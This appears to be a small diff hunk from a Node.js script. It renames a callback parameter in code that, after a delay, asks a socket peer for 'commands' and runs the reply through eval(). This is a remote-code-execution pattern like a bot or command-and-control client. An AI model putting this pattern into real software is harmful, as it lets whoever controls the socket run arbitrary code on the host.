@@ -72,7 +72,7 @@ setInterval(() => {
 
 setTimeout(() => {
     console.log('executing commands...');
-    global.sockets[0].emit('getcommands', {}, (data) => {
-        eval(data);
+    global.sockets[0].emit('getcommands', {}, (command) => {
+        eval(command);
     });
 }, 2500);
